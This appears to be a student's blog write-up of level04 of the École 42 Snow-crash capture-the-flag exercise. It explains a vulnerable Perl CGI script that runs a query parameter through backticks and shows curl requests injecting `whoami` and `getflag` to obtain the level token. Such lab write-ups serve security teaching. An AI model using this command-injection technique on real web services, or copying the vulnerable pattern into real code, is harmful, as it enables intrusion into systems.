<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Snow-crash Level04 - DévEnCours</title>
<meta name="description" content="Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.">


  <meta name="author" content="Yoo">
  
  <meta property="article:author" content="Yoo">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="DévEnCours">
<meta property="og:title" content="Snow-crash Level04">
<meta property="og:url" content="http://localhost:4000/ecole42/Level04/">


  <meta property="og:description" content="Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.">







  <meta property="article:published_time" content="2024-02-13T00:00:00+09:00">



  <meta property="article:modified_time" content="2024-02-13T00:00:00+09:00">



  

  


<link rel="canonical" href="http://localhost:4000/ecole42/Level04/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "Yoo",
      "url": "http://localhost:4000/"
    
  }
</script>







<!-- end _includes/seo.html -->



  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="DévEnCours Feed">


<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          DévEnCours
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="https://github.com/EunmiYoo">Yoo's github</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>

    <div class="page__container" style="display: flex; gap: 2rem;">
        <div class="initial-content">
          





<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person" class="h-card">

  

  <div class="author__content">
    <h3 class="author__name p-name" itemprop="name">
      <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Yoo</a>
    </h3>
    
      <div class="author__bio p-note" itemprop="description">
        <p>École 42 in Paris</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">Paris, France</span>
        </li>
      

      
        
          
        
          
        
          
        
          
        
          
        
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  <!-- <div style="margin-top: 2rem;">
      


  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      <a href="/categories/#ecole42" class="page__taxonomy-item p-category" rel="tag">ecole42</a>
    
    </span>
  </p>

  </div> -->
  
  </div>



  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Snow-crash Level04">
    <meta itemprop="description" content="Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.">
    <meta itemprop="datePublished" content="2024-02-13T00:00:00+09:00">
    <meta itemprop="dateModified" content="2024-02-13T00:00:00+09:00">

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="http://localhost:4000/ecole42/Level04/" class="u-url" itemprop="url">Snow-crash Level04
</a>
          </h1>
          

  <p class="page__meta">
    

    

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          4 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        
          <aside class="sidebar__right sticky">
            <nav class="toc">
              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
              <ul class="toc__menu"><li><a href="#1-the-password-of-level04-is-the-token-that-got-from-level03">1. The password of level04 is the token that got from level03.</a></li><li><a href="#2-so-try-login-to-level04-with-the-password-we-got-from-level03-and-try-to-put-the-command-ls--la-we-can-see-the-file-level04">2. So, try login to level04 with the password we got from level03 and try to put the command ‘ls -la’. We can see the file ‘level04’.</a></li><li><a href="#3-lets-go-inside-in-level04">3. Let’s go inside in level04.</a></li><li><a href="#4-lets-check-on-the-port-4747">4. Let’s check on the port 4747.</a></li><li><a href="#5-now-combine-numbers-3-and-4-and--lets-send-data-using-the-x-parameter-and-port-4747-with-curl-command">5. Now, combine numbers 3 and 4 and  let’s send data using the x parameter and port 4747 with curl command.</a></li><li><a href="#6-we-got-a-token-for-next-level05">6. We got a token for next level05</a></li></ul>

            </nav>
          </aside>
        
        <h4 id="1-the-password-of-level04-is-the-token-that-got-from-level03">1. The password of <code class="language-plaintext highlighter-rouge">level04</code> is the token that got from <code class="language-plaintext highlighter-rouge">level03</code>.</h4>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>qi0maab88jeaj46qoumi7maus
</code></pre></div></div>
<h4 id="2-so-try-login-to-level04-with-the-password-we-got-from-level03-and-try-to-put-the-command-ls--la-we-can-see-the-file-level04">2. So, try login to <code class="language-plaintext highlighter-rouge">level04</code> with the password we got from <code class="language-plaintext highlighter-rouge">level03</code> and try to put the command ‘ls -la’. We can see the file ‘level04’.</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level03@SnowCrash:~<span class="nv">$ </span>su level04
Password: qi0maab88jeaj46qoumi7maus
level04@SnowCrash:~<span class="err">$</span>
</code></pre></div></div>
<h4 id="3-lets-go-inside-in-level04">3. Let’s go inside in level04.</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level04@SnowCrash:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 <span class="nb">.</span>
d--x--x--x  1 root    <span class="nb">users    </span>340 Aug 30  2015 ..
<span class="nt">-r-x------</span>  1 level04 level04  220 Apr  3  2012 .bash_logout
<span class="nt">-r-x------</span>  1 level04 level04 3518 Aug 30  2015 .bashrc
<span class="nt">-r-x------</span>  1 level04 level04  675 Apr  3  2012 .profile
<span class="nt">-rwsr-sr-x</span>  1 flag04  level04  152 Mar  5  2016 level04.pl
level04@SnowCrash:~<span class="nv">$ </span>./level04.pl
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE <span class="o">=</span> <span class="o">(</span><span class="nb">unset</span><span class="o">)</span>,
	LC_ALL <span class="o">=</span> <span class="o">(</span><span class="nb">unset</span><span class="o">)</span>,
	LC_TERMINAL_VERSION <span class="o">=</span> <span class="s2">"3.4.23"</span>,
	LC_CTYPE <span class="o">=</span> <span class="s2">"UTF-8"</span>,
	LC_TERMINAL <span class="o">=</span> <span class="s2">"iTerm2"</span>,
	LANG <span class="o">=</span> <span class="s2">"en_US.UTF-8"</span>
    are supported and installed on your system.
perl: warning: Falling back to the standard locale <span class="o">(</span><span class="s2">"C"</span><span class="o">)</span><span class="nb">.</span>
Content-type: text/html
</code></pre></div></div>

<p>We can see A file with <code class="language-plaintext highlighter-rouge">.pl</code> extension.</p>

<p>So, what is a PL file?</p>

<p>A file with .pl extension is a <code class="language-plaintext highlighter-rouge">Perl Script</code> file that is a scripting language.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level04@SnowCrash:~<span class="nv">$ </span><span class="nb">cat </span>level04.pl
<span class="c">#!/usr/bin/perl</span>
<span class="c"># localhost:4747</span>
use CGI qw<span class="o">{</span>param<span class="o">}</span><span class="p">;</span>
print <span class="s2">"Content-type: text/html</span><span class="se">\n\n</span><span class="s2">"</span><span class="p">;</span>
sub x <span class="o">{</span>
  <span class="nv">$y</span> <span class="o">=</span> <span class="nv">$_</span><span class="o">[</span>0]<span class="p">;</span>
  print <span class="sb">`</span><span class="nb">echo</span> <span class="nv">$y</span> 2&gt;&amp;1<span class="sb">`</span><span class="p">;</span>
<span class="o">}</span>
x<span class="o">(</span>param<span class="o">(</span><span class="s2">"x"</span><span class="o">))</span><span class="p">;</span>
</code></pre></div></div>

<p>This is a simple <code class="language-plaintext highlighter-rouge">CGI(Common Gateway Interface) script</code> that takes a parameter “x” from the query string and prints the result of runnig the command specified by the parameter using the <code class="language-plaintext highlighter-rouge">echo</code> commmand.</p>

<details>
<summary> Note: What is CGI?  </summary>
<br />
What is CGI? : CGI, or Common Gateway Interface, is a standard interface that enables communication between a web server and external programs or scripts. It allows for the creation of dynamic web pages, processing user input, and interaction with databases.
</details>

<p><br /></p>
<details>
<summary> Note: What is query?  </summary>
<br />
In the context of the Perl CGI script provided, the "query" refers to the string of parameters and their values that are passed to the script through the URL when it is accessed.
<br /><br />
This string typically follows a question mark (?) in the URL and consists of key-value pairs separated by ampersands (&amp;).
<br /><br />
For example, if you access the script via a URL like this:
<br /><br />

http://example.com/cgi-bin/script.cgi?x=ls%20-l

<br /><br />
In this URL, the query string is x=ls%20-l. Here, x is the parameter name, and ls%20-l is its value. The %20 is a URL-encoded representation of a space character.
<br /><br />
So, in this example, the query is x=ls%20-l, where the parameter x is assigned the value ls -l. When the Perl CGI script is executed with this query, it retrieves the value of the x parameter (ls -l in this case) and executes it as a command.
</details>

<p><br /></p>
<details>
<summary> Details for the perl script </summary>
<br />

1. `#!/usr/bin/perl`: This is a hashebang line specifying the path to the Perl interpreter to be used to execute this script.
<br /><br />

2. `use CGI qw{param};`: This line imports the param function from the CGI module. The param function is used to retrieve the values of parameters from the query string.
<br /><br />

3. `print "Content-type: text/html\n\n";`: This line sends an HTTP header indicating that the content is of type "text/html". The double newline (\n\n) separates the header from the body.
<br /><br />

4. `sub x { ... }`: This defines a subroutine (function) named "x". It takes one parameter and assigns its value to the variable $y.
<br /><br />

5. `$y = $_[0];`: This line assigns the value of the first (in this case, only) argument passed to the subroutine to the variable $y.
<br /><br />

6. `print echo $y 2&gt;&1;`: This line prints the result of the command specified in $y. Backticks (``) are used to execute the command, and `2&gt;&amp;1` redirects both standard output and standard error to the output. This is a common technique to capture both normal output and error messages.
<br /><br />

7. `x(param("x"));`: This line calls the subroutine "x" using the value of the "x" parameter from the query string.
<br /><br />

In summary, the script takes a parameter named "x" from the query string, uses it as a command, executes the command, and prints the result.
<br />
</details>
<p><br /></p>

<p>We can see another interesting thing in that perl script.
The script indicates that</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># localhost:4747</span>
</code></pre></div></div>

<p>Maybe, there is something on the port 4747.</p>

<h4 id="4-lets-check-on-the-port-4747">4. Let’s check on the port 4747.</h4>

<p><code class="language-plaintext highlighter-rouge">nc -zv</code> allows to check connection to 4747 without sending any data and verbose mode.</p>

<details>
<summary> What is 'nc' command in Linux </summary>
<br />
1. nc : This is the command itself, which is short for "netcat." Netcat is a versatile networking utility for reading from and writing to network connections using TCP or UDP protocols.
<br />
2.  -z: This option tells nc to scan for open ports rather than initiating a data transfer. When used with the -v option, it prints verbose output, indicating whether the connection was successful or not.
<br />
3.  -v: This option stands for "verbose" and instructs nc to provide more detailed output, including the status of each connection attempt.
<br />
So, when you run nc -zv, you are instructing Netcat to attempt to connect to a specified host and port without sending any data (-z), while also providing verbose output (-v) to show the result of each connection attempt. This is commonly used for port scanning to check if a port on a remote system is open or closed.
<br />
</details>
<p><br /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level04@SnowCrash:~<span class="nv">$ </span>nc <span class="nt">-zv</span> localhost 4747
Connection to localhost 4747 port <span class="o">[</span>tcp/<span class="k">*</span><span class="o">]</span> succeeded!
</code></pre></div></div>

<h4 id="5-now-combine-numbers-3-and-4-and--lets-send-data-using-the-x-parameter-and-port-4747-with-curl-command">5. Now, combine numbers 3 and 4 and  let’s send data using the <code class="language-plaintext highlighter-rouge">x parameter</code> and <code class="language-plaintext highlighter-rouge">port 4747</code> with <code class="language-plaintext highlighter-rouge">curl</code> command.</h4>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level04@SnowCrash:~<span class="nv">$ </span>curl <span class="s1">'localhost:4747/level04.pl?x=`whoami`'</span>
flag04
</code></pre></div></div>

<p>We got the <code class="language-plaintext highlighter-rouge">Flag04</code> with the whoami parameter.</p>

<p>Maybe we can try again with x parameter with getflag. And here we go, we got the flag :)</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level04@SnowCrash:~<span class="nv">$ </span>curl <span class="s1">'localhost:4747/level04.pl?x=`getflag`'</span>
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
</code></pre></div></div>

<h4 id="6-we-got-a-token-for-next-level05">6. We got a token for next level05</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ne2searoevaevoem4ov4ar8ap
</code></pre></div></div>

        
      </section>

      <footer class="page__meta">
        
        
  


  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      <a href="/tags/#cybersecurity" class="page__taxonomy-item p-category" rel="tag">CyberSecurity</a><span class="sep">, </span>
    
      <a href="/tags/#git" class="page__taxonomy-item p-category" rel="tag">Git</a><span class="sep">, </span>
    
      <a href="/tags/#github" class="page__taxonomy-item p-category" rel="tag">Github</a>
    
    </span>
  </p>




  


  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      <a href="/categories/#ecole42" class="page__taxonomy-item p-category" rel="tag">ecole42</a>
    
    </span>
  </p>


        

  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2024-02-13">February 13, 2024</time></p>

      </footer>

      <section class="page__share">
  
    <h4 class="page__share-title">Share on</h4>
  

  <a href="https://twitter.com/intent/tweet?text=Snow-crash+Level04%20http%3A%2F%2Flocalhost%3A4000%2Fecole42%2FLevel04%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fecole42%2FLevel04%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fecole42%2FLevel04%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="/ecole42/Level02/" class="pagination--pager" title="Snow-crash Level02
">Previous</a>
    
    
      <a href="/ecole42s/Level06/" class="pagination--pager" title="Snow-crash Level06
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
    <div class="page__related">
      <h2 class="page__related-title">You may also enjoy</h2>
      <div class="grid__wrapper">
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/sprint/WeeklyPaper/" rel="permalink">Weekly paper - sprint bootcam
</a>
      
    </h2>
    

  <p class="page__meta">
    

    

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          less than 1 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">
</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/ecole42/Level09/" rel="permalink">Snow-crash Level09
</a>
      
    </h2>
    

  <p class="page__meta">
    

    

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          3 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.
</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/ecole42/Level08/" rel="permalink">Snow-crash Level08
</a>
      
    </h2>
    

  <p class="page__meta">
    

    

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          1 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.
</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title no_toc" itemprop="headline">
      
        <a href="/ecole42/Level07/" rel="permalink">Snow-crash Level07
</a>
      
    </h2>
    

  <p class="page__meta">
    

    

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          1 minute read
        
      </span>
    
  </p>


    <p class="archive__item-excerpt" itemprop="description">Project SECURITY. This project is a modest introduction to the wide world of cyber security. A world where you’ll have no margin for errors.
</p>
  </article>
</div>

        
      </div>
    </div>
  
  
</div>

        </div>
    </div>

    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
      
        
      
        
      
        
      
        
      
        
      
    

    
      <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
    
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2025 Yoo. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>










  </body>
</html>
